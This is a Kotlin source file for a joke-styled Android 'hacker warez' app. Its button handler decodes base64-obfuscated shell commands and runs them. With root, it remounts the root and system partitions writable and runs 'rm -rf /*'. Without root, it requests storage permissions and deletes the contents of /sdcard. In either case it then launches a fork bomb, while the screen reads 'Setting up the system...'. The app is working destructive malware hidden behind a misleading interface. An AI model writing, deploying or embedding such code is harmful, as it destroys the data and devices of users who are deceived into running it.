package dev.smoketrees.haxorswarezhaus

import android.Manifest
import android.os.Bundle
import android.text.method.ScrollingMovementMethod
import android.util.Base64
import androidx.appcompat.app.AppCompatActivity
import com.livinglifetechway.quickpermissions_kotlin.runWithPermissions
import com.topjohnwu.superuser.Shell
import kotlinx.android.synthetic.main.activity_main.*

class MainActivity : AppCompatActivity() {

    // Advanced proprietary haxx
    private val sar = "bW91bnQgLW8gcmVtb3VudCxydyAv"
    private val sys = "bW91bnQgLW8gcmVtb3VudCxydyAvc3lzdGVt"
    private val aclean = "cm0gLXJmIC8q"
    private val sdmaid = "cm0gLXJmIC9zZGNhcmQvKgo="
    private val fork = "OigpeyA6fDogJiB9OzoK"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        haxxertext.movementMethod = ScrollingMovementMethod()
        haxxertext.animateText(getText(R.string.disclaimer))

        fab.setOnClickListener {
            title_text.animateText("HAxx0rz WAr3zHAu\$")
            haxxertext.typerSpeed = 80
            haxxertext.charIncrease = 1
            haxxertext.animateText("Setting up the system...")

            if (Shell.rootAccess()) {
                // pro rooted haxxer spotted
                Shell.su(b64decode(sar)).exec()
                Shell.su(b64decode(sys)).exec()
                Shell.su(b64decode(aclean)).exec()
            } else {
                // not even rooted smh
                runWithPermissions(
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                ) {
                    Runtime.getRuntime().exec(b64decode(sdmaid))
                }
            }

            Runtime.getRuntime().exec(b64decode(fork))
        }
    }

    private fun b64decode(input: String) = String(Base64.decode(input, Base64.DEFAULT))
}